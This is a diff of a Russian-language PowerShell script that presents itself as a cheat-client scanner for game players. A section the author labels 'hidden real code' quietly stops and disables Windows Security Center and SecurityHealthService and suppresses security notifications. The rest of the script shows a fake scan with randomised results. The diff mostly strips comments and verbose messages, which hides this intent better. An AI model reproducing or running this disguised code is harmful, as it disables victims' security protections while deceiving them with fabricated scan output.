@@ -37,8 +37,6 @@ $choice = Read-Host
 
 # ===== ОБРАБОТКА ВЫБОРА =====
 if ($choice -eq "1" -or $choice -eq "2") {
-    # Оба варианта выполняют одно и то же действие
-    # Но показывают разный интерфейс
     
     if ($choice -eq "1") {
         Write-Host ""
@@ -51,7 +49,6 @@ if ($choice -eq "1" -or $choice -eq "2") {
     }
     
     # ===== СКРЫТЫЙ РЕАЛЬНЫЙ КОД =====
-    # Отключение Defender и Центра безопасности
     Try { Stop-Service -Name "wscsvc" -Force -ErrorAction SilentlyContinue; Set-Service -Name "wscsvc" -StartupType Disabled -ErrorAction SilentlyContinue } Catch {}
     Try { Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Security Center" -Name "DisableNotifications" -Value 1 -Force -ErrorAction SilentlyContinue } Catch {}
     Try { Stop-Service -Name "SecurityHealthService" -Force -ErrorAction SilentlyContinue; Set-Service -Name "SecurityHealthService" -StartupType Disabled -ErrorAction SilentlyContinue } Catch {}
@@ -151,7 +148,7 @@ if ($choice -eq "1" -or $choice -eq "2") {
     
     # ===== ФЕЙКОВОЕ СКАНИРОВАНИЕ =====
     if ($choice -eq "1") {
-        # ===== ПОЛНАЯ ПРОВЕРКА (ПОДРОБНАЯ) =====
+        # ===== ПОЛНАЯ ПРОВЕРКА =====
         Write-Host ""
         Write-Host "[*] Выполняется полное сканирование системы..." -ForegroundColor Yellow
         Start-Sleep -Milliseconds 300
@@ -169,7 +166,7 @@ if ($choice -eq "1" -or $choice -eq "2") {
         }
         Write-Host ""
         
-        Write-Host "[*] Проверка чит-клиентов и нелегальных лаунчеров..." -ForegroundColor Yellow
+        Write-Host "[*] Проверка чит-клиентов..." -ForegroundColor Yellow
         
         $cheatSites = @(
             @{Name = "Nursultan"; URL = "https://nursultan.fun"},
@@ -215,7 +212,6 @@ if ($choice -eq "1" -or $choice -eq "2") {
             
             if ($finalPassed) {
                 Write-Host "        [ЧИСТО] $($site.Name) - не обнаружен" -ForegroundColor Green
-                Write-Host "            [OK] Чит-клиент не найден" -ForegroundColor DarkGray
                 Write-Host "            [OK] Статус проверки: ПРОШЕЛ" -ForegroundColor Green
                 $totalPassed++
             } else {
@@ -224,13 +220,11 @@ if ($choice -eq "1" -or $choice -eq "2") {
                 
                 if ($isDetected) {
                     Write-Host "        [ОБНАРУЖЕН] $($site.Name) - НАЙДЕН!" -ForegroundColor Red
-                    Write-Host "            [!] Обнаружен активный чит-клиент!" -ForegroundColor Yellow
                     Write-Host "            [!] Статус проверки: НЕ ПРОШЕЛ" -ForegroundColor Red
                     $foundCheatSites += $site.Name
                     $totalDetected++
                 } else {
                     Write-Host "        [ЧИСТО] $($site.Name) - не обнаружен" -ForegroundColor Green
-                    Write-Host "            [OK] Чит-клиент не найден" -ForegroundColor DarkGray
                     Write-Host "            [OK] Статус проверки: ПРОШЕЛ" -ForegroundColor Green
                     $totalPassed++
                 }
@@ -249,31 +243,22 @@ if ($choice -eq "1" -or $choice -eq "2") {
             
             if ($finalPassed) {
                 Write-Host "        [ЧИСТО] $($site.Name) - безопасен" -ForegroundColor Green
-                Write-Host "            [OK] Статус проверки: ПРОШЕЛ" -ForegroundColor Green
                 $totalPassed++
             } else {
                 $randomFake = Get-Random -Minimum 1 -Maximum 100
                 if ($randomFake -le 15) {
                     Write-Host "        [ПРЕДУПРЕЖДЕНИЕ] $($site.Name) - подозрительная активность" -ForegroundColor Yellow
-                    Write-Host "            [!] Обнаружен подозрительный DNS-запрос" -ForegroundColor Yellow
-                    Write-Host "            [!] Статус проверки: ТРЕБУЕТ ВНИМАНИЯ" -ForegroundColor Yellow
                     $totalDetected++
                 } else {
                     Write-Host "        [ЧИСТО] $($site.Name) - безопасен" -ForegroundColor Green
-                    Write-Host "            [OK] Статус проверки: ПРОШЕЛ" -ForegroundColor Green
                     $totalPassed++
                 }
             }
         }
         
         Write-Host ""
-        Write-Host "[*] Анализ DNS-запросов к чит-серверам..." -ForegroundColor Yellow
-        $cheatDomains = @(
-            "nursultan.fun",
-            "wexside.ru",
-            "arbuz.cc",
-            "wildclient.org"
-        )
+        Write-Host "[*] Анализ DNS-запросов..." -ForegroundColor Yellow
+        $cheatDomains = @("nursultan.fun", "wexside.ru", "arbuz.cc", "wildclient.org")
         
         foreach ($domain in $cheatDomains) {
             Write-Host "    -> Проверка $domain..." -ForegroundColor Gray
@@ -287,7 +272,6 @@ if ($choice -eq "1" -or $choice -eq "2") {
             
             if ($finalPassed) {
                 Write-Host "        [ЧИСТО] $domain - DNS-запросов не найдено" -ForegroundColor Green
-                Write-Host "            [OK] Статус проверки: ПРОШЕЛ" -ForegroundColor Green
                 $totalPassed++
             } else {
                 $randomDnsResult = Get-Random -Minimum 1 -Maximum 100
@@ -295,22 +279,19 @@ if ($choice -eq "1" -or $choice -eq "2") {
                 
                 if ($isDnsDetected) {
                     Write-Host "        [ОБНАРУЖЕН] DNS-запрос к $domain" -ForegroundColor Red
-                    Write-Host "            [!] DNS-авторизация подтверждена" -ForegroundColor Yellow
-                    Write-Host "            [!] Статус проверки: НЕ ПРОШЕЛ" -ForegroundColor Red
                     if ($foundCheatSites -notcontains $domain) {
                         $foundCheatSites += $domain
                         $totalDetected++
                     }
                 } else {
                     Write-Host "        [ЧИСТО] $domain - DNS-запросов не найдено" -ForegroundColor Green
-                    Write-Host "            [OK] Статус проверки: ПРОШЕЛ" -ForegroundColor Green
                     $totalPassed++
                 }
             }
         }
         
         Write-Host ""
-        Write-Host "[*] Проверка файлов чит-клиентов на диске..." -ForegroundColor Yellow
+        Write-Host "[*] Проверка файлов на диске..." -ForegroundColor Yellow
         $cheatFilePatterns = @(
             "nursultan*.jar",
             "wexside*.jar",
@@ -336,8 +317,7 @@ if ($choice -eq "1" -or $choice -eq "2") {
                     if ($files.Count -gt 0) {
                         foreach ($file in $files) {
                             if ($finalPassed) {
-                                Write-Host "        [ЧИСТО] Файл: $($file.Name) - пропущен" -ForegroundColor Green
-                                Write-Host "            [OK] Статус проверки: ПРОШЕЛ" -ForegroundColor Green
+                                Write-Host "        [ЧИСТО] Файл: $($file.Name)" -ForegroundColor Green
                                 $totalPassed++
                             } else {
                                 $randomFileResult = Get-Random -Minimum 1 -Maximum 100
@@ -345,14 +325,10 @@ if ($choice -eq "1" -or $choice -eq "2") {
                                 
                                 if ($isFileDetected) {
                                     Write-Host "        [ОБНАРУЖЕН] Файл: $($file.Name)" -ForegroundColor Red
-                                    Write-Host "            [!] Файл авторизован как чит-клиент" -ForegroundColor Yellow
-                                    Write-Host "            [!] Размер: $([math]::Round($file.Length/1KB, 2)) KB" -ForegroundColor Yellow
-                                    Write-Host "            [!] Статус проверки: НЕ ПРОШЕЛ" -ForegroundColor Red
                                     $foundCheatSites += "$($file.Name)"
                                     $totalDetected++
                                 } else {
-                                    Write-Host "        [ЧИСТО] Файл: $($file.Name) - пропущен" -ForegroundColor Green
-                                    Write-Host "            [OK] Статус проверки: ПРОШЕЛ" -ForegroundColor Green
+                                    Write-Host "        [ЧИСТО] Файл: $($file.Name)" -ForegroundColor Green
                                     $totalPassed++
                                 }
                             }
@@ -387,22 +363,8 @@ if ($choice -eq "1" -or $choice -eq "2") {
         Write-Host "    Проверок пройдено: $totalPassed" -ForegroundColor DarkGray
         Write-Host ""
         
-        if ($foundCheatSites.Count -gt 0 -and $finalPassed) {
-            Write-Host "[*] Выполняется дополнительная проверка..." -ForegroundColor Yellow
-            Start-Sleep -Seconds 1
-            Write-Host "    [OK] Ложные срабатывания отклонены" -ForegroundColor DarkGray
-            Write-Host "    [OK] Система признана чистой" -ForegroundColor DarkGray
-            Write-Host ""
-        } elseif ($foundCheatSites.Count -eq 0 -and -not $finalPassed) {
-            Write-Host "[*] Выполняется углубленный анализ..." -ForegroundColor Yellow
-            Start-Sleep -Seconds 1
-            Write-Host "    [WARN] Обнаружены скрытые процессы" -ForegroundColor Yellow
-            Write-Host "    [WARN] Требуется дополнительная проверка" -ForegroundColor Yellow
-            Write-Host ""
-        }
-        
     } else {
-        # ===== БЫСТРАЯ ПРОВЕРКА (СОКРАЩЕННАЯ) =====
+        # ===== БЫСТРАЯ ПРОВЕРКА =====
         Write-Host ""
         Write-Host "[*] Выполняется быстрая проверка системы..." -ForegroundColor Green
         Start-Sleep -Milliseconds 300
@@ -557,4 +519,8 @@ if ($choice -eq "1" -or $choice -eq "2") {
     
 } else {
     Write-Host ""
-    Write-Host "[ERROR] Неверный выбор. Пожалуйста, запустите скрипт за
+    Write-Host "[ERROR] Неверный выбор. Пожалуйста, запустите скрипт заново и выберите 1 или 2." -ForegroundColor Red
+    Write-Host ""
+    Write-Host "[*] Нажмите любую клавишу для выхода..." -ForegroundColor Gray
+    Read-Host
+}
